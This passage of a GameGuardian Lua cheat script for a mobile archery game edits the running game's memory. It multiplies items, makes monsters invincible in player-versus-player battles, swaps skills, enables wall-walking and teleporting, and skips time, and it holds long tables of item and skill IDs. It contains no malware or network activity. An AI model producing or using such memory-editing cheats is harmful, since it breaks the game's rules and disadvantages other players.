    local t = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
	  local newValues = {}
    for i, v in ipairs(t) do
		  if v.value < 6 then
		    v.value = 6
		    table.insert(newValues, v)
		  elseif v.value < 9 then
			  v.value = 9
		    table.insert(newValues, v)
		  elseif v.value < values[1] + 1 then
			  v.value = values[1]
		    table.insert(newValues, v)
		  elseif v.value >22 and v.value < 115 then
			  v.value = 115
		    table.insert(newValues, v)
		  end
	  end
	  gg.setValues(newValues)
	  gg.toast("ℹMultiply Item\226\153\187\239\184\143")
  end
  gg.clearResults()
end
function multi()    --- Multi drop items
  gg.clearResults()
  local config = loadConfig()
  local values = gg.prompt({
    "ℹHow many item(X) did you drop?📥 ",
    "ℹHow many do you want to Multiply?✅"
  }, config.max or {"1~60"}, {"number", "number"})
  if values == nil then
    return
  end
  config.max = values
  saveConfig(config)
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("1000000000D~3000000000;1000000000D~3000000000;1Q;" .. values[1] .. ";4294967295Q;4294967296Q;1D::33", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber(values[1], gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  if 1 > gg.getResultsCount() then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll(values[2], gg.TYPE_DWORD)
    gg.toast("ℹMultiply Item\226\153\187\239\184\143")
    gg.clearResults()
  end
end

---- other hack
function MSTbattle()
  local item = gg.choice(map(itemsSpec7, function(item)
    return item.name
  end), nil, "ℹ Which monster does your opponent not have, but do you have?\nYou can choose more than One, but only One is enough to win")
  if item == nil then
    return
  end
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber(itemsSpec7[item].id .. "D" .. ";1;4575657221408423936Q;1065353216Q;4575657221408423936Q;1065353216Q;4575657221408423936Q;1065353216;4575657221408423936Q;1065353216Q;0F::381", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("4575657221408423936Q;1065353216;4575657221408423936Q;1065353216Q;4575657221408423936Q;1065353216Q;0F::29", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.refineNumber("0", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  if gg.getResultsCount() < 1 then
    gg.clearResults()
    gg.alert("\226\154\160\239\184\143Error!... Unable to activate this Hack, please try again or restart the game")
  else
    gg.editAll("9999", gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast(string.format("%s ℹSuccess.... Monster Invencible Activated", itemsSpec7[item].name), true)
  end
end
-- fuction run
function SwapThroughWall()
	gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("1000001~1000200;1Q;3;0~2Q::77", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 30)
    gg.refineNumber("1000001~7000007", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
    revert = gg.getResults(30, nil, nil, nil, nil, nil, nil, nil, nil)
    if gg.getResultsCount() < 1 then
      gg.clearResults()
      gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
    else
		gg.editAll("7000007", gg.TYPE_DWORD)
		gg.toast("%s ℹThrough Wall Success♋")
        gg.clearResults()
    end
end

function skin()     --- swap skill itemsSpec6
  local itemType = gg.choice({
    "✡️Hero Skin 🛐",
    "✡️Specials Abilities ♒",
    "✡️rrow Abilities ♈",
    "✡️Circle Abilities ♋",
    "✡️Spirit Abilities ☯️",
    "✡️Explosive Abilities 🌋",
    "✡️Attack Boost Abilities ♐",
    "✡️Health Dependent Abilities ♥️",
    "✡️Other Abilities ✡",
    "✡️Not available yet Abilities ☮"
  }, nil, "ℹ Choose a skill type 🔀\n")
  if itemType == nil then
    return
  end
  local item = gg.choice(map(itemsSpec6[itemType], function(item)
    return item.name
  end), nil, "ℹ Qwhich skill do you want to select? ♋\n")
  if item == nil then
    return
  end
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("1000001~1000200", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(30, nil, nil, nil, nil, nil, nil, nil, nil)
  gg.editAll(itemsSpec6[itemType][item].id, gg.TYPE_DWORD)
  if gg.getResultsCount() > 1 then
    gg.toast(string.format("%s ℹSkill Selected Success\226\153\139", itemsSpec6[itemType][item].name), true)
    gg.clearResults()
  elseif gg.getResultsCount() < 1 then
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("1000001~1000200;1Q;3;0~2Q::77", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 30)
    gg.refineNumber("1000001~7000007", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
    revert = gg.getResults(30, nil, nil, nil, nil, nil, nil, nil, nil)
    if gg.getResultsCount() < 1 then
      gg.clearResults()
      gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
    else
      local t = gg.getResults(30, nil, nil, nil, nil, nil, nil, nil, nil)
      for i, v in ipairs(t) do
        local resultNumber = gg.getResultsCount()
        if resultNumber % 1 == 0 then
          local results = gg.getResults(30)
          local newValues = {}
          for index, result in ipairs(results) do
            if index % 1 == 0 then
              result.value = itemsSpec6[itemType][item].id
              table.insert(newValues, result)
            end
          end
          gg.setValues(newValues)
          local t = gg.getResults(9, nil, nil, nil, nil, nil, nil, nil, nil)
          t = nil
          gg.toast(string.format("%s ℹSkill Selected Success♋", itemsSpec6[itemType][item].name), true)
        end
        gg.clearResults()
      end
    end
  end
end
function etenegry() --- jumpt time
  gg.clearResults()
  gg.timeJump("1:0:0:1")
  gg.clearResults()
end
function gig()      --- Monster treasure
  gg.alert("⚠️Only activate when Eliminate all monsters in Monster Treasure event♨️\n\nYou will receive 20 Bones and 20 Monster Meat🥩 for the Total 40 Items in this event.")
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("1000000000D~3000000000;1000000000D~3000000000;1Q;2~40;4294967295Q;4294967296Q;1D::33", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("2~40", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  if gg.getResultsCount() < 1 then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("20", gg.TYPE_DWORD)
    gg.toast("ℹMax Monster Treasure Event Items")
    gg.clearResults()
  end
end

function deck()     --- change iteam to pvp
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("6000000~8000000Q;1000000000~2300000000;1000000000~2300000000;1Q;1000000000~2300000000;1000000000~2300000000;1Q;1~3;0~8::53", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 81)
  gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;0~8::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  if gg.getResultsCount() < 1 then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    local t = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.addListItems(t)
    t = nil
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;0::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1010808;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;1::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1020608;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;2::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1030608;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;3::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1030508;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;4::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1040608;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;5::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1040508;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;6::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1060608;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;7::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1050608;0;120;0", gg.TYPE_DWORD)
    gg.clearResults()
    t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000;1~3;8::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000;1000000000~2300000000::45", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    revert = gg.getResults(4, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("1070608;0;120;0", gg.TYPE_DWORD)
    gg.toast("ℹSuccess... 🧮Deck Master Místico Full Transformado👑")
    gg.clearList(t)
    gg.clearResults()
  end
end

function telesand() --- teleport with root
  gg.clearResults()
  local item = gg.choice(map(itemstle, function(item)
    return item.name
  end), nil, "jump jump jump")
  if item == 7 then
	local config = loadConfig()
	local values = gg.prompt({
    "ℹ Where u want to jump?📥 ",
    }, config.telesand or {}, {"number"})
	itemstle[7].id = values[1]
	if values 	== nil then   	return 		end
  end
  if 	item 	== nil then 	return   	end

  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("1000000000~2300000000;1000000000~2300000000;1Q;0Q;0D;0Q;0D;1000000000~2300000000;1000000000~2300000000;1Q;0Q;0D;1000000000~2300000000;1000000000~2300000000;1Q::61", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
  gg.refineNumber("100000000~2300000000", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(2, nil, nil, nil, nil, nil, nil, nil, nil)
  if 1 > gg.getResultsCount() then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    r = gg.getResults(2)
    local t = {}
    t[1] = {}
    t[1].address = r[1].address
    t[1].flags = gg.TYPE_DWORD
    t[1].value = itemstle[item].id
    gg.setValues(t)
    t[1] = {}
    t[1].address = r[2].address
    t[1].flags = gg.TYPE_DWORD
    t[1].value = 0
    gg.setValues(t)

    gg.toast("ℹSuccess...🤸‍♂️_______________🌴🚧🌴 \nTeleported to the chosen room🚧...")
  end
end


function event()
  local  event = gg.choice(
    {
      "✡️Mỏ đá☯️ - 2 lần/ngày",
      "✡️Đạn bay☯️ - 2 lần/ngày",
      "✡️Mê cung cổ đại☯️ - 1 lần/ngày",
      "✡️Nguy hiểm cận kề☯️ - 2 lần/ngày",
      "✡️Về - k chơi nữa↩️"
    }, nil, "⚜️⚜️⚜️ LƯU Ý KHI SỬ DỤNG : PHẢI ĐỂ FULL 10 LƯỢT XONG HÙNG. NGÀY NÀO KHÔNG CÓ EVENT MÌNH CẦN!! MỖI LẦN CHẠY XONG THÌ NHẤN NÚT HOME RỒI MỚI CHẠY SCRIPT TIẾP.  ⚜️⚜️⚜️")
  if event == 1     then     moda()      end
  if event == 2     then     danbay()    end
  if event == 3     then     mecung()    end
  if event == 4    	then     nhck()      end
  if event == 5   	then     main()      end
end

function moda()
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("201;10;99::33", gg.TYPE_DWORD)
  gg.refineNumber("201;10;99", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  gg.editAll("113;1;10", gg.TYPE_DWORD)
  gg.clearResults()
  gg.toast("Rồi!! Chuyển qua tab Năng Lực rồi quay lại Tab Sự Kiện để chơi")
end

function danbay()
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("201;10;99::33", gg.TYPE_DWORD)
  gg.refineNumber("201;10;99", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  gg.editAll("102;1;5", gg.TYPE_DWORD)
  gg.clearResults()
  gg.toast("Rồi!! Chuyển qua tab Năng Lực rồi quay lại Tab Sự Kiện để chơi")
end

function mecung()
  gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("201;10;99::33", gg.TYPE_DWORD)
  gg.refineNumber("201;10;99", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
    revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("401;1;20", gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("Rồi!! Chuyển qua tab Năng Lực rồi quay lại Tab Sự Kiện để chơi")
end

function nhck()
  gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("201;10;99::33", gg.TYPE_DWORD)
  gg.refineNumber("201;10;99", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
    revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll("109;1;10", gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("Rồi!! Chuyển qua tab Năng Lực rồi quay lại Tab Sự Kiện để chơi")
end

function engery()
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("256~257;720;257::200", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
  gg.refineNumber("720", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  if 1 > gg.getResultsCount() then
    gg.alert("\226\154\160\239\184\143Couldn't activate this hack at the moment!\226\153\168\239\184\143 ...\n\n\226\132\185Try again or restart the game\240\159\152\170")
  else
    gg.editAll("9", gg.TYPE_DWORD)
    gg.toast("\240\159\148\139Energy Sucess\240\159\148\139...")
    gg.clearResults()
  end
end

--iteams list

itemshbossegg = { -- hatch boss egg --
  {
    id = 2001,
    name = "\240\159\141\153 Put 2 Small Dragon Egg \240\159\144\137 (60)"
  },
  {
    id = 2002,
    name = "\240\159\141\153 Put 5 Lead Archer's Egg \240\159\143\185 (80)"
  },
  {
    id = 2003,
    name = "\240\159\141\153 Put 6 Skeleton King Egg \240\159\146\128 (80)"
  },
  {
    id = 2004,
    name = "\240\159\141\153 Put 5 Crimson Witch's Egg \240\159\167\158\226\128\141\226\153\128\239\184\143 (80)"
  },
  {
    id = 2005,
    name = "\240\159\141\153 Put 3 Angry Golem Egg \240\159\166\143 (60)"
  },
  {
    id = 2006,
    name = "\240\159\141\153 Put 6 Queen Bee \240\159\144\157 (200)"
  },
  {
    id = 2007,
    name = "\240\159\141\153 Put 19 Ice Worm Egg \240\159\144\155 (250)"
  },
  {
    id = 2008,
    name = "\240\159\141\153 Put 3 Jellyfish Egg \240\159\167\156\226\128\141\226\153\128\239\184\143 (100)"
  },
  {
    id = 2009,
    name = "\240\159\165\148 Ice Demon Egg"
  },
  {
    id = 2010,
    name = "\240\159\165\148 Egg of Fire Demon\195\180Fire Demon"
  },
  {
    id = 2011,
    name = "\240\159\165\148 Chief Crab Egg"
  },
  {
    id = 2012,
    name = "\240\159\165\148 Giant Owl Egg"
  },
  {
    id = 2013,
    name = "\240\159\165\148 Desert Goliath Egg"
  }
}
itemshnegg = {    -- hatch normal egg
  {
    id = 1001,
    name = " \240\159\144\163 35 Green Bat Egg \240\159\166\135 (200)"
  },
  {
    id = 1002,
    name = " \240\159\144\163 20 Slime Egg \240\159\144\184 80"
  },
  {
    id = 1003,
    name = " \240\159\144\163 36 Bomb Ghost Egg \240\159\145\187 (300)"
  },
  {
    id = 1004,
    name = " \240\159\144\163 30 Stone Dummy Egg \240\159\164\150 (250)"
  },
  {
    id = 1005,
    name = " \240\159\144\163 75 Party Tree Egg \240\159\140\178 (55)0"
  },
  {
    id = 1006,
    name = " \240\159\144\163 75 Greyhound Egg \240\159\144\182 (650)"
  },
  {
    id = 1007,
    name = " \240\159\144\163 60 Skeleton Archer Egg \240\159\143\185 (450)"
  },
  {
    id = 1008,
    name = " \240\159\144\163 120 Skeleton Soldier Egg \226\152\160 (1800)"
  },
  {
    id = 1009,
    name = " \240\159\144\163 65 Wasp Egg \240\159\144\157 (550)"
  },
  {
    id = 1010,
    name = " \240\159\144\163 75 Fire Mage Egg \240\159\146\130 (1000)"
  },
  {
    id = 1011,
    name = " \240\159\144\163 70 Jellyfish Egg \240\159\167\156\226\128\141\226\153\128\239\184\143 (1200)"
  },
  {
    id = 1012,
    name = " \240\159\144\163 60 Ice Mage Egg \226\157\132\239\184\143 (950)"
  },
  {
    id = 1013,
    name = " \240\159\144\163 55 Fire Lizard Egg \240\159\144\138 (1000)"
  },
  {
    id = 1014,
    name = " \240\159\144\163 90 Flaming Ghost Egg \240\159\148\165 (2200)"
  },
  {
    id = 1015,
    name = " \240\159\144\163 80 Thorny Snake Egg \240\159\144\141 (1600)"
  },
  {
    id = 1016,
    name = " \240\159\144\163 35 Tornado Demon Egg \240\159\145\191 (450)"
  },
  {
    id = 1017,
    name = " \240\159\144\163 48 Piranha Egg \240\159\144\159 (400)"
  },
  {
    id = 1018,
    name = " \240\159\144\163 90 Zombie Egg \240\159\167\159\226\128\141\226\153\130\239\184\143 (1800)"
  },
  {
    id = 1019,
    name = " \240\159\144\163 60 Scarecrow Egg \240\159\145\183\226\128\141\226\153\130\239\184\143 (700)"
  },
  {
    id = 1020,
    name = " \240\159\144\163 75 Long Dragon Egg \240\159\144\137 (1600)"
  },
  {
    id = 1021,
    name = " \240\159\144\163 60 Skull Mage Egg \226\152\160 (850)"
  },
  {
    id = 1022,
    name = " \240\159\144\163 55 Larva Golem Egg \240\159\166\160 (800)"
  },
  {
    id = 1023,
    name = " \240\159\144\163 75 Ice Golem Egg \240\159\166\143 (1200)"
  },
  {
    id = 1024,
    name = " \240\159\144\163 65 Cactus Egg \240\159\140\181 (900)"
  },
  {
    id = 1025,
    name = " \240\159\144\163 90 Mad Spider Egg \240\159\149\183 (1800)"
  },
  {
    id = 1026,
    name = " \240\159\144\163 56/95 Fire Element Egg \240\159\143\181 (2800)"
  },
  {
    id = 1027,
    name = " \240\159\144\163 85 Swordsman Skeleton Egg \240\159\146\128 (1400)"
  },
  {
    id = 1028,
    name = " \240\159\144\163 85 Sickle Mage Egg \240\159\145\187 (1400)"
  },
  {
    id = 1029,
    name = " \240\159\144\163 75 Shadowslayer Egg \240\159\145\164 (950)"
  },
  {
    id = 1030,
    name = " \240\159\144\163 55 Tornado Mage Egg \240\159\140\170 (700)"
  },
  {
    id = 1031,
    name = " \240\159\144\163 65 Pea Shooter Egg \240\159\140\177 (1350)"
  },
  {
    id = 1032,
    name = "\240\159\165\154 Hell Puppet Egg"
  },
  {
    id = 1033,
    name = "\240\159\165\154 Fallen Bat Egg\195\173"
  },
  {
    id = 1034,
    name = "\240\159\165\154 Sandian's Egg"
  },
  {
    id = 1035,
    name = "\240\159\165\154 Psionic Scarecrow Egg\195\180"
  },
  {
    id = 1036,
    name = "\240\159\165\154 Wild Spider Egg"
  },
  {
    id = 1037,
    name = "\240\159\165\154 One-Eyed Bat Egg"
  },
  {
    id = 1038,
    name = "\240\159\165\154 Dragon Egg\195\163o Tundra"
  },
  {
    id = 1039,
    name = "\240\159\165\154 Purple Ghost Egg"
  },
  {
    id = 1040,
    name = "\240\159\165\154 Frosty Ghost Egg"
  },
  {
    id = 1041,
    name = "\240\159\165\154 Steel Dr\195\173ade's Egg"
  },
  {
    id = 1042,
    name = "\240\159\165\154 Flaming Bug Egg"
  },
  {
    id = 1043,
    name = "\240\159\165\154 Elite Archer Egg"
  },
  {
    id = 1044,
    name = "\240\159\165\154 Spinning Mushroom Egg"
  },
  {
    id = 1045,
    name = "\240\159\165\154 Spitting Mushroom Egg"
  },
  {
    id = 1046,
    name = "\240\159\165\154 Scarlet Mage Egg"
  }
}
itemsSpec6 = {    -- skill id
  {
    {
      id = 1400010,
      name = "✡️ Taranis  ☯️"
    },
    {
      id = 1400011,
      name = "✡️ Urasil  ☯️"
    },
    {
      id = 1400012,
      name = "✡️ Phoren  ☯️"
    },
    {
      id = 1400013,
      name = "✡️ Onir  ☯️"
    },
    {
      id = 1400014,
      name = "✡️ Rolla  ☯️"
    },
    {
      id = 1400015,
      name = "✡️ Helix  ☯️"
    },
    {
      id = 1400016,
      name = "✡️ Bonnie  ☯️"
    },
    {
      id = 1400017,
      name = "✡️ Miaugyk  ☯️"
    },
    {
      id = 1400018,
      name = "✡️ Sylvan  ☯️"
    },
    {
      id = 1400019,
      name = "🔟  Shari  ☯️"
    },
    {
      id = 1400020,
      name = "✡️ Sombra  ☯️"
    },
    {
      id = 1400021,
      name = "✡️ Ayana  ☯️"
    },
    {
      id = 1400022,
      name = "✡️ Ofelia  ☯️"
    },
    {
      id = 1400023,
      name = "✡️ Atreus  ☯️"
    },
    {
      id = 1400024,
      name = "✡️ Ryan  ☯️"
    },
    {
      id = 1400025,
      name = "✡️ Lina  ☯️"
    },
    {
      id = 1400027,
      name = "✡️ Aquea  ☯️"
    },
    {
      id = 1400028,
      name = "✡️ Shingen  ☯️"
    },
    {
      id = 1400029,
      name = "✡️ Gugu  ☯️"
    },
    {
      id = 1400030,
      name = "✡️ Iris  ☯️"
    },
    {
      id = 1400031,
      name = "✡️  Blazo  ☯️"
    }
  },
  {
    {
      id = 7000006,
      name = "✡️Water Walker 🏝"
    },
    {
      id = 7000007,
      name = "✡️Through Wall 🧱"
    },
    {
      id = 1000170,
      name = "✡️Hermes Shoes ⛸"
    },
    {
      id = 1000135,
      name = "✡️Toxic Trail ♒"
    },
    {
      id = 1000037,
      name = "✡️Trail of Fire 🔥"
    },
    {
      id = 1000032,
      name = "✡️Play as Shuriken ♒"
    },
    {
      id = 1000108,
      name = "✡️Electrefies Enemies ⚡"
    },
    {
      id = 1000065,
      name = "✡️Divine Shield ♎"
    },
    {
      id = 1000191,
      name = "✡️Unknow 🕉"
    }
  },
  {
    {
      id = 1000001,
      name = "✡️Front Arrow ⬆️⬆️"
    },
    {
      id = 1000025,
      name = "✡️Diagonal Arrows ↖️⬆️↗️"
    },
    {
      id = 1000026,
      name = "✡️Piercing Shoot ⬆️"
    },
    {
      id = 1000028,
      name = "✡️Ricochet ↩↪"
    },
    {
      id = 1000003,
      name = "✡️Bounce Wall ↩🧱"
    },
    {
      id = 1000004,
      name = "✡️Rear Arrow ↕️"
    },
    {
      id = 1000050,
      name = "✡️Side Arrows ⬅️⬆️➡️"
    },
    {
      id = 1000008,
      name = "✡️Multishoot ⏫"
    },
    {
      id = 1000011,
      name = "✡️Poison Touch Arrow ♐"
    },
    {
      id = 1000012,
      name = "✡️Bolt Arrow ⚡"
    },
    {
      id = 1000013,
      name = "✡️Blaze Arrow 🔥"
    },
    {
      id = 1000020,
      name = "✡️Freeze Arrow ❄"
    },
    {
      id = 1000044,
      name = "✡️Holy Touch 🌀"
    },
    {
      id = 1000163,
      name = "✡️Dark Touch 🌚"
    }
  },
  {
    {
      id = 1000021,
      name = "✡️Fire Circle 🔥"
    },
    {
      id = 1000022,
      name = "✡️Ice Circle ❄"
    },
    {
      id = 1000023,
      name = "✡️Poison Circle ♋"
    },
    {
      id = 1000024,
      name = "✡️Bolt Circle ⚡"
    },
    {
      id = 1000164,
      name = "✡️Obdisian Circle 🌑"
    },
    {
      id = 1000119,
      name = "✡️Fire Sword 🔥"
    },
    {
      id = 1000120,
      name = "✡️Ice Sword ❄"
    },
    {
      id = 1000121,
      name = "✡️Poison Sword ♋"
    },
    {
      id = 1000122,
      name = "✡️Bolt Sword ⚡"
    }
  },
  {
    {
      id = 1000073,
      name = "✡️Spirit Multi Shoot ⏫"
    },
    {
      id = 1000089,
      name = "✡️Spirit Blaze 🔥"
    },
    {
      id = 1000090,
      name = "✡️Spirit Freeze ❄"
    },
    {
      id = 1000091,
      name = "✡️Spirit Bolt ⚡"
    },
    {
      id = 1000092,
      name = "✡️Spirit Poisoned Touch ⚛"
    },
    {
      id = 1000093,
      name = "✡️Spirit Front Arrow ⬆️⬆️"
    },
    {
      id = 1000094,
      name = "✡️Spirit flechas diagonais ↖️⬆️↗️"
    },
    {
      id = 1000095,
      name = "✡️Spirit Atack 🗡"
    },
    {
      id = 1000096,
      name = "✡️Spirit Atack critico ⚠️"
    },
    {
      id = 1000148,
      name = "✡️Spirit + Speed Bost🧪"
    },
    {
      id = 1000134,
      name = "✡️Inspitation (+Speed Boost Spirit) 🧪"
    },
    {
      id = 1000133,
      name = "✡️Unity (+Attack Spirit) 🗡"
    },
    {
      id = 1000116,
      name = "✡️Summon One-Eyed Bat 🧿"
    },
    {
      id = 1000087,
      name = "✡️Wingman 💪"
    }
  },
  {
    {
      id = 1000123,
      name = "✡️Fire Strike 🔥"
    },
    {
      id = 1000124,
      name = "✡️Ice Strike ❄"
    },
    {
      id = 1000125,
      name = "✡️Toxic Strike ♋"
    },
    {
      id = 1000126,
      name = "✡️Bolt Strike ⚡"
    },
    {
      id = 1000127,
      name = "✡️Frost Meteor ❄"
    },
    {
      id = 1000128,
      name = "✡️Toxic Meteor ☯️"
    },
    {
      id = 1000129,
      name = "✡️Blazing Meteor ☄"
    },
    {
      id = 1000143,
      name = "✡️Bolt Meteor ⚡"
    },
    {
      id = 1000136,
      name = "✡️Blazing Star ☄"
    },
    {
      id = 1000137,
      name = "✡️Frost Star ❄"
    },
    {
      id = 1000138,
      name = "✡️Toxic Star ✡"
    },
    {
      id = 1000139,
      name = "✡️Bolt Star ⚡"
    },
    {
      id = 1000030,
      name = "✡️Death Bomb 💣"
    },
    {
      id = 1000058,
      name = "✡️Chilling Blast 🥶"
    },
    {
      id = 1000045,
      name = "✡️Death New 🌋"
    }
  },
  {
    {
      id = 1000156,
      name = "✡️Critic Aura 💫"
    },
    {
      id = 1000035,
      name = "✡️Critic Master (Major) ⚠️"
    },
    {
      id = 1000157,
      name = "✡️Speed Aura ⏩"
    },
    {
      id = 1000038,
      name = "✡️Speed Boost (Major)n⏭"
    },
    {
      id = 1000016,
      name = "✡️Attack Boost (Major) ⚔"
    },
    {
      id = 6000001,
      name = "✡️Attack Boost (Minor) 🗡"
    },
    {
      id = 1000159,
      name = "✡️Attack Plus ⛏"
    },
    {
      id = 1000130,
      name = "✡️Fury (Speed Attack HP Low) 🤬"
    },
    {
      id = 1000161,
      name = "✡️Critic Plus 💢"
    },
